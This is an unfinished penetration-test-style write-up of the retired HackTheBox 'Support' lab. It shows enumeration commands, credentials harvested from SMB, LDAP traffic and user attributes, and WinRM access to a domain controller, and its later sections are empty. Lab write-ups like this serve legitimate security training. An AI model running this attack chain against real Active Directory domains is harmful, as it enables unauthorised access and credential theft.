# HTB Support - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-20

---

## 0. Lesson Learned



---

## 1. Executive Summary

A Windows Active Directory domain controller (SUPPORT.HTB) was compromised through exposed SMB shares containing sensitive binaries. Reverse engineering of an application revealed LDAP credentials, which were used to enumerate the domain and obtain valid user credentials.

Initial access was achieved via WinRM. Privilege escalation was performed using Resource-Based Constrained Delegation (RBCD), allowing impersonation of the Administrator account and full domain compromise.

---

## 2. Scope

- **Target:** 10.129.230.181
- **Domain:** SUPPORT.HTB
- **Environment:** HackTheBox Support (Retired Machine)
- **Testing Window:** 2026-3-19 to 2026-3-20
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.230.181 -T4 -oA support_tcp
```

Exposed services:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 135/tcp - RPC
- 139,445/tcp - SMB
- 389,636/tcp - LDAP
- 464/tcp - Kpasswd
- 3268,3269/tcp - Global Catalog
- 5985/tcp - WinRM

This indicates the target is an Active Directory Domain Controller.

---

## 5. Enumeration

SMB shares were enumerated:

```
smbclient -L //10.129.230.181 -N
```

Anonymous SMB access is enabled and exposed a share named `support-tools`.

The share was listed non-interactively revealing a `UserInfo.exe` binary.

```
smbclient //10.129.230.181/support-tools -N -c 'ls'
```

The binary was executed and credentials were observed in Wireshark traffic:

```
mono ./UserInfo.exe -v find -first armando
```

Revealing the following credentials in LDAP traffic:

```
ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

The credentials were validated:

```
crackmapexec smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Resulting in valid credentials for the `ldap` account.

These credentials were used to map the domain with Bloodhound:

```
bloodhound-python -d support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.129.230.181 -c All --zip
```

Revealing a privilege escalation path from `support` to machine account `DC.SUPPORT.HTB` to `CoerceToTGT` to `Administrator`.

The domain was further enumerated with ldap:

```
ldapsearch -H ldap://10.129.230.181 -D 'ldap@support.htb' -b "DC=support,DC=htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' "(objectClass=person)"
```

Revealing the credentials in the `support` users `Info` field:

```
support : Ironside47pleasure40Watchful
```

Credentials were validated with CME:

```
crackmapexec winrm 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

Resulting in an owned `support` account.

---

## 6. Initial Access

Initial access was achieved with WinRM:

```
crackmapexec winrm 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

---

## 7. Post-Exploitation

---

## 8. Privilege Escalation

---

## 9. Proof of Compromise

---

## 10. Findings & Recommendations

---

## 11. Appendix